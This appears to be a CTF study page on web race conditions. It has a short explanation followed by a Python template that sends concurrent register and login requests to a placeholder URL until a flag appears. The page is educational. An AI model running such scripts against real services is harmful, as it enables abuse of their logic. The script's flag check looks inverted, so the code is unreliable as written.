# 🏁 Race conditions

A race condition happens when concurrent calls lead to a not wanted status of the system.
This can occur in web app because they are thought for multiple user access at the same time.

For example, consider two users that want to modify the same value.
They interact with the server and ask to it in parallel for two different changes.
No synchronization between calls, no transactions for read and write or whatever multithreads control system is implemented.

<p align="center">
    <img src={require("./assets/race_condition.jpg").default}></img>
</p>

## Exploit template

```py
#!/usr/bin/env python3

import random
import string
import requests
import threading
import time

# change this value with the base url like "https://challenge.pwn"
URL = "URL"

# very simple way for multithread communication
# remember to use `global found`
found = False


def register(session, username, password):
    url = "%s/register" % URL
    payload = {"username": username, "password": password}
    r = session.post(url, data=payload)
    return r.text


def login(session, username, password):
    # import global found to communicate with the main thread
    global found

    url = "%s/login" % URL
    payload = {"username": username, "password": password}
    r = session.post(url, data=payload)

    # check for flag and print output
    if "flag" not in r.text:
        print(r.text)
        found = True

    return r.text


def random_string():
    k = random.randint(6, 15)
    allowed_chars = string.ascii_lowercase + string.digits
    return "".join(random.choices(allowed_chars, k=k))


# test calls

session = requests.Session()
username = random_string()
password = random_string()

res = register(session, username, password)
assert "success" in res

res = login(session, username, password)
assert "success" in res

# start exploit

while not found:
    session = requests.Session()
    username = random_string()
    password = random_string()

    t_register = threading.Thread(target=register,
        args=(session, username, password))
    t_register.start()

    # sometimes, a small delay between calls could be needed
    k = random.random() / 10
    time.sleep(k)

    t_login = threading.Thread(target=login,
        args=(session, username, password))
    t_login.start()

    # wait for the last thread to finish
    t_login.join(timeout=1)
```
